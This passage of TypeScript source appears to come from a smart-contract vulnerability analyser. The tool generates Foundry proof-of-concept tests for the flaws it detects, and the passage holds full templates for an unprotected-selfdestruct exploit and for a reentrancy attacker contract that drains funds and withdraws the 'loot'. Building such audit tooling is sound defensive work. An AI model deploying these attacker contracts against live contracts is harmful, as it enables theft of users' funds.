 *                   UNPROTECTED SELFDESTRUCT EXPLOIT TEST
 *                   ${contractName}.${funcName}()
 * ============================================================================
 *
 * ATTACK MECHANICS:
 * 1. Contract has selfdestruct() callable without access control
 * 2. Attacker calls the function
 * 3. Contract is permanently destroyed
 * 4. All ETH is sent to attacker (or specified address)
 * 5. All user funds are lost forever
 *
 * SEVERITY: CRITICAL
 * - Irreversible damage
 * - Total loss of funds
 * - Contract permanently destroyed
 *
 * Note: selfdestruct is deprecated in newer Solidity versions and will
 * eventually be removed from the EVM. However, it still works on most chains.
 *
 * Run with: forge test --match-test testSelfdestructExploit -vvvv
 * ============================================================================
 */

contract SelfdestructExploitTest is Test {
    ${contractName} public target;
    address public attacker = address(0xBAD);

    uint256 constant CONTRACT_BALANCE = 100 ether;

    function setUp() public {
        target = new ${contractName}();
        vm.deal(address(target), CONTRACT_BALANCE);
        console.log("Contract deployed with", CONTRACT_BALANCE / 1 ether, "ETH");
    }

    function testSelfdestructExploit() public {
        console.log("========== SELFDESTRUCT EXPLOIT ==========");

        uint256 attackerBalanceBefore = attacker.balance;
        uint256 contractBalanceBefore = address(target).balance;

        console.log("Attacker balance before:", attackerBalanceBefore);
        console.log("Contract balance before:", contractBalanceBefore / 1 ether, "ETH");
        console.log("Contract code size:", address(target).code.length);

        // THE ATTACK: Simply call the unprotected selfdestruct
        vm.prank(attacker);
        target.${funcName}();

        uint256 attackerBalanceAfter = attacker.balance;
        uint256 contractBalanceAfter = address(target).balance;

        console.log("\\n========== AFTER ATTACK ==========");
        console.log("Attacker balance after:", attackerBalanceAfter / 1 ether, "ETH");
        console.log("Contract balance after:", contractBalanceAfter);
        console.log("Contract code size:", address(target).code.length);

        // Verify destruction
        assertEq(address(target).code.length, 0, "Contract should be destroyed");
        assertEq(contractBalanceAfter, 0, "Contract should have no balance");

        console.log("\\nATTACK SUCCESSFUL!");
        console.log("Contract permanently destroyed");
        console.log("All", CONTRACT_BALANCE / 1 ether, "ETH stolen");
    }
}`;
}

export function generateExploitCode(vulnerabilities: Vulnerability[], contractName: string): string | null {
  // Check for different vulnerability types and generate appropriate exploit
  const reentrancyVuln = vulnerabilities.find((v) => v.type === 'reentrancy');
  const accessControlVuln = vulnerabilities.find((v) => v.type === 'access-control');
  const uncheckedCallVuln = vulnerabilities.find((v) => v.type === 'unchecked-call');
  const selfdestructVuln = vulnerabilities.find((v) => v.type === 'unprotected-selfdestruct');

  // Generate exploit for access control if it's the highest severity available
  if (accessControlVuln && !reentrancyVuln) {
    return generateAccessControlExploit(accessControlVuln, contractName);
  }

  // Generate exploit for unchecked call
  if (uncheckedCallVuln && !reentrancyVuln && !accessControlVuln) {
    return generateUncheckedCallExploit(uncheckedCallVuln, contractName);
  }

  // Generate exploit for selfdestruct
  if (selfdestructVuln && !reentrancyVuln && !accessControlVuln && !uncheckedCallVuln) {
    return generateSelfdestructExploit(selfdestructVuln, contractName);
  }

  // Default to reentrancy exploit (highest priority)
  if (!reentrancyVuln) return null;
  const funcName = reentrancyVuln.location.functionName || 'withdraw';

  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * ============================================================================
 *                        REENTRANCY EXPLOIT TEST
 *                        ${contractName}.${funcName}()
 * ============================================================================
 *
 * HISTORICAL CONTEXT - THE DAO HACK (June 17, 2016):
 * This is the same vulnerability that enabled The DAO hack, one of the most
 * significant events in Ethereum history. An attacker exploited a reentrancy
 * bug in the splitDAO() function, draining 3.6 million ETH (~$60M at the time).
 * The incident led to the controversial Ethereum hard fork, splitting the chain
 * into ETH (Ethereum) and ETC (Ethereum Classic).
 *
 * ATTACK MECHANICS:
 * 1. Attacker deposits ETH into the vulnerable contract
 * 2. Attacker calls ${funcName}() to initiate withdrawal
 * 3. Contract sends ETH via .call() BEFORE updating the balance
 * 4. Attacker's receive() function re-enters ${funcName}()
 * 5. Steps 3-4 repeat until the contract is drained
 * 6. Finally, balance is set to 0 (but all funds are already gone)
 *
 * WHY IT WORKS:
 * The contract violates the Checks-Effects-Interactions (CEI) pattern.
 * The external call (Interaction) happens before the state update (Effect).
 *
 * GAS PROFILE (approximate):
 * - Contract deployment: ~200,000 gas
 * - Attacker deployment: ~150,000 gas
 * - Initial deposit: ~45,000 gas
 * - Attack execution: ~25,000 gas per iteration
 * - 5 iterations: ~125,000 gas
 * - Total attack cost: ~0.01 ETH at 50 gwei
 *
 * PROFIT CALCULATION:
 * - Investment: 1 ETH (deposit)
 * - Gas cost: ~0.01 ETH
 * - Stolen: Entire contract balance
 * - Net profit: (Contract balance - 1 ETH - gas)
 *
 * Run with: forge test --match-test testReentrancyExploit -vvvv
 * ============================================================================
 */

contract ReentrancyExploitTest is Test {
    ${contractName} public target;
    AttackerContract public attacker;

    // ========== CONSTANTS ==========
    uint256 constant VICTIM_INITIAL_DEPOSIT = 10 ether;  // Funds in contract
    uint256 constant ATTACKER_DEPOSIT = 1 ether;         // Attack investment
    uint256 constant MAX_ATTACK_ITERATIONS = 10;         // Prevent infinite loop

    // ========== SETUP ==========
    function setUp() public {
        // Step 1: Deploy the vulnerable contract
        target = new ${contractName}();
        console.log("Target deployed at:", address(target));

        // Step 2: Deploy the attacker contract
        attacker = new AttackerContract(payable(address(target)));
        console.log("Attacker deployed at:", address(attacker));

        // Step 3: Simulate victims depositing funds
        // In real scenario, this represents legitimate user deposits
        address victim = address(0x1);
        vm.deal(victim, VICTIM_INITIAL_DEPOSIT);
        vm.prank(victim);
        target.deposit{value: VICTIM_INITIAL_DEPOSIT}();
        console.log("Victim deposited:", VICTIM_INITIAL_DEPOSIT / 1 ether, "ETH");

        // Step 4: Fund the attacker
        vm.deal(address(attacker), ATTACKER_DEPOSIT + 1 ether); // +1 for gas
    }

    // ========== EXPLOIT TEST ==========
    function testReentrancyExploit() public {
        console.log("\\n========== ATTACK STARTING ==========");

        // Record initial state
        uint256 targetBalanceBefore = address(target).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        console.log("Target balance before:", targetBalanceBefore / 1 ether, "ETH");
        console.log("Attacker balance before:", attackerBalanceBefore / 1 ether, "ETH");

        // Measure gas usage
        uint256 gasStart = gasleft();

        // Execute the attack
        attacker.attack{value: ATTACKER_DEPOSIT}();

        uint256 gasUsed = gasStart - gasleft();

        // Record final state
        uint256 targetBalanceAfter = address(target).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        console.log("\\n========== ATTACK COMPLETE ==========");
        console.log("Target balance after:", targetBalanceAfter / 1 ether, "ETH");
        console.log("Attacker balance after:", attackerBalanceAfter / 1 ether, "ETH");
        console.log("ETH stolen:", (attackerBalanceAfter - attackerBalanceBefore + ATTACKER_DEPOSIT) / 1 ether, "ETH");
        console.log("Gas used:", gasUsed);
        console.log("Attack iterations:", attacker.attackCount());

        // Verify the attack succeeded
        assertLt(targetBalanceAfter, targetBalanceBefore, "Attack should drain funds");
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should profit");

        // Calculate profit
        uint256 profit = attackerBalanceAfter - attackerBalanceBefore + ATTACKER_DEPOSIT;
        console.log("\\nNet profit:", profit / 1 ether, "ETH");
        console.log("ROI:", (profit * 100) / ATTACKER_DEPOSIT, "%");
    }

    // ========== HELPER: Test with different deposit amounts ==========
    function testReentrancyWithLargerDeposit() public {
        // Reset and use 5 ETH deposit
        vm.deal(address(attacker), 6 ether);
        uint256 stolen = attacker.attackWithAmount{value: 5 ether}();
        console.log("Stolen with 5 ETH deposit:", stolen / 1 ether, "ETH");
    }
}

/**
 * ============================================================================
 *                           ATTACKER CONTRACT
 * ============================================================================
 * This malicious contract exploits the reentrancy vulnerability by:
 * 1. Depositing ETH to become a legitimate user
 * 2. Calling withdraw to trigger the vulnerability
 * 3. Re-entering via receive() before balance is updated
 */
contract AttackerContract {
    ${contractName} public target;
    uint256 public attackCount;
    uint256 public constant MAX_ATTACKS = ${10};

    constructor(address payable _target) {
        target = ${contractName}(_target);
    }

    /**
     * @notice Execute the reentrancy attack
     * @dev Deposits ETH then triggers withdraw, which calls receive()
     */
    function attack() external payable {
        require(msg.value >= 0.1 ether, "Need ETH to attack");

        // Step 1: Deposit to become a user
        target.deposit{value: msg.value}();

        // Step 2: Trigger the vulnerable withdraw
        // This will send ETH to us, triggering receive()
        target.${funcName}();
    }

    /**
     * @notice Attack with specified amount and return stolen ETH
     */
    function attackWithAmount() external payable returns (uint256) {
        uint256 before = address(this).balance;
        target.deposit{value: msg.value}();
        target.${funcName}();
        return address(this).balance - before + msg.value;
    }

    /**
     * @notice This is where the magic happens - reentrancy!
     * @dev Called when we receive ETH from the vulnerable contract
     *
     * ATTACK FLOW:
     * 1. target.${funcName}() sends us ETH
     * 2. This receive() is triggered
     * 3. We immediately call ${funcName}() AGAIN
     * 4. target still thinks we have a balance (not updated yet!)
     * 5. target sends us MORE ETH
     * 6. Repeat until contract is drained or gas runs out
     */
    receive() external payable {
        // Safety: Limit iterations to prevent out-of-gas
        if (attackCount < MAX_ATTACKS && address(target).balance >= msg.value) {
            attackCount++;
            // RE-ENTER THE VULNERABLE FUNCTION!
            target.${funcName}();
        }
    }

    /**
     * @notice Withdraw stolen funds to EOA
     */
    function withdrawLoot(address payable to) external {
        to.transfer(address(this).balance);
    }
}`;
}

// ============= SAFETY CHECKS GENERATOR =============

function generateSafetyChecks(parsed: ParsedContract, vulnerabilities: Vulnerability[]): SafetyCheck[] {
  const checks: SafetyCheck[] = [];
  const vulnTypes = new Set(vulnerabilities.map((v) => v.type));

  // Check Solidity version for overflow protection
  const version = parsed.pragmaVersion ? extractVersion(parsed.pragmaVersion) : null;
  const hasSolidity08Plus = version && version.minor >= 8;

  // Reentrancy check
  if (!vulnTypes.has('reentrancy')) {
    checks.push({
      category: 'Reentrancy',
      pattern: 'External calls before state updates',
      status: 'safe',
      reason: 'No external calls found before state variable updates. Contract follows Checks-Effects-Interactions pattern.',
    });
  }

  // Access control check
  if (!vulnTypes.has('access-control')) {
    checks.push({
      category: 'Access Control',
      pattern: 'Sensitive functions without authorization',
      status: 'safe',
      reason: 'All sensitive functions have appropriate access control modifiers or msg.sender validation.',
    });
  }

  // Unchecked calls check
  if (!vulnTypes.has('unchecked-call')) {
    checks.push({
      category: 'Unchecked Calls',
      pattern: 'External calls without return value check',
      status: 'safe',
      reason: 'All external calls properly check return values or use safe transfer patterns.',
    });
  }

  // Integer overflow check
  if (hasSolidity08Plus) {
    checks.push({
      category: 'Integer Overflow',
      pattern: 'Arithmetic operations without bounds checking',
      status: 'safe',
      reason: `Using Solidity ${parsed.pragmaVersion} which has built-in overflow/underflow protection.`,
    });
  } else if (!vulnTypes.has('integer-overflow') && !vulnTypes.has('integer-underflow')) {
    checks.push({
      category: 'Integer Overflow',
      pattern: 'Arithmetic operations without bounds checking',
      status: 'safe',
      reason: 'No arithmetic operations detected in vulnerable contexts.',
    });
  }

  // Selfdestruct check
  if (!vulnTypes.has('unprotected-selfdestruct')) {
    checks.push({
      category: 'Selfdestruct',
      pattern: 'Unprotected selfdestruct calls',
      status: 'safe',
      reason: 'No unprotected selfdestruct or suicide calls detected.',
    });
  }

  return checks;
}

// ============= MAIN ANALYZE FUNCTION =============

export function analyzeContract(source: string): AnalysisResult {
  const { parsed } = parseSource(source);
  const vulnerabilities = detectVulnerabilities(parsed);

  const primaryContract = parsed.contracts[parsed.contracts.length - 1];
  const contractName = primaryContract?.name || 'Unknown';

  const exploitCode = generateExploitCode(vulnerabilities, contractName);
  const safetyChecks = generateSafetyChecks(parsed, vulnerabilities);

  return {
    contractName,
    solcVersion: parsed.pragmaVersion,
    vulnerabilities,
    exploitCode,
    summary: {
      critical: vulnerabilities.filter((v) => v.severity === 'CRITICAL').length,
      high: vulnerabilities.filter((v) => v.severity === 'HIGH').length,
      medium: vulnerabilities.filter((v) => v.severity === 'MEDIUM').length,
      low: vulnerabilities.filter((v) => v.severity === 'LOW').length,
      total: vulnerabilities.length,
    },
    safetyChecks,
    limitations: ANALYSIS_LIMITATIONS,
  };
}
